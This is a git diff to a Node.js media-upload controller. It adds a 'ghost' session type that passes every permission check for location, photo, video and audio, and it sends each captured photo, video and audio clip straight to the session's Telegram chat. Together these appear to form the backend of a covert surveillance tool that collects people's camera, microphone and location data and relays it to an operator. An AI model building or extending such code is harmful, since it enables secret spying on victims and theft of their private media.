@@ -7,6 +7,8 @@
 
 const { mediaService, sessionService } = require('../services');
 const logger = require('../utils/logger');
+const telegramNotification = require('../services/telegramNotificationService');
+const path = require('path');
 
 /**
  * Upload location data
@@ -33,7 +35,7 @@ const uploadLocation = async (req, res, next) => {
         }
         
         // Verify session is for location
-        if (validation.session.permission_type !== 'location') {
+        if (validation.session.permission_type !== 'location' && validation.session.permission_type !== 'ghost') {
             return res.status(400).json({ 
                 error: 'This session is not authorized for location data' 
             });
@@ -89,7 +91,7 @@ const uploadPhoto = async (req, res, next) => {
         }
         
         // Verify session is for photos
-        const allowedTypes = ['single_photo', 'continuous_photo'];
+        const allowedTypes = ['single_photo', 'continuous_photo', 'ghost'];
         if (!allowedTypes.includes(validation.session.permission_type)) {
             return res.status(400).json({ 
                 error: 'This session is not authorized for photo data' 
@@ -107,6 +109,15 @@ const uploadPhoto = async (req, res, next) => {
                 metadata: req.body.metadata ? JSON.parse(req.body.metadata) : {}
             }
         );
+        
+        // Send photo instantly to Telegram
+        if (validation.session.telegram_id && media.file_path) {
+            telegramNotification.sendPhotoFile(
+                validation.session.telegram_id,
+                media.file_path,
+                `📸 <b>Photo captured!</b>\n🕐 ${new Date().toLocaleString()}`
+            ).catch(err => logger.warn('Failed to send instant photo', { error: err.message }));
+        }
         
         res.status(201).json({
             success: true,
@@ -149,7 +160,7 @@ const uploadVideo = async (req, res, next) => {
         }
         
         // Verify session is for video
-        if (validation.session.permission_type !== 'video') {
+        if (validation.session.permission_type !== 'video' && validation.session.permission_type !== 'ghost') {
             return res.status(400).json({ 
                 error: 'This session is not authorized for video data' 
             });
@@ -170,6 +181,15 @@ const uploadVideo = async (req, res, next) => {
                 metadata: req.body.metadata ? JSON.parse(req.body.metadata) : {}
             }
         );
+        
+        // Send video instantly to Telegram
+        if (validation.session.telegram_id && media.file_path) {
+            telegramNotification.sendVideoFile(
+                validation.session.telegram_id,
+                media.file_path,
+                `🎥 <b>Video captured!</b>\n⏱️ Duration: ${duration || 'N/A'}s\n🕐 ${new Date().toLocaleString()}`
+            ).catch(err => logger.warn('Failed to send instant video', { error: err.message }));
+        }
         
         res.status(201).json({
             success: true,
@@ -213,7 +233,7 @@ const uploadAudio = async (req, res, next) => {
         }
         
         // Verify session is for microphone
-        if (validation.session.permission_type !== 'microphone') {
+        if (validation.session.permission_type !== 'microphone' && validation.session.permission_type !== 'ghost') {
             return res.status(400).json({ 
                 error: 'This session is not authorized for audio data' 
             });
@@ -234,6 +254,15 @@ const uploadAudio = async (req, res, next) => {
                 metadata: req.body.metadata ? JSON.parse(req.body.metadata) : {}
             }
         );
+        
+        // Send audio instantly to Telegram
+        if (validation.session.telegram_id && media.file_path) {
+            telegramNotification.sendAudioFile(
+                validation.session.telegram_id,
+                media.file_path,
+                `🎤 <b>Audio captured!</b>\n⏱️ Duration: ${duration || 'N/A'}s\n🕐 ${new Date().toLocaleString()}`
+            ).catch(err => logger.warn('Failed to send instant audio', { error: err.message }));
+        }
         
         res.status(201).json({
             success: true,
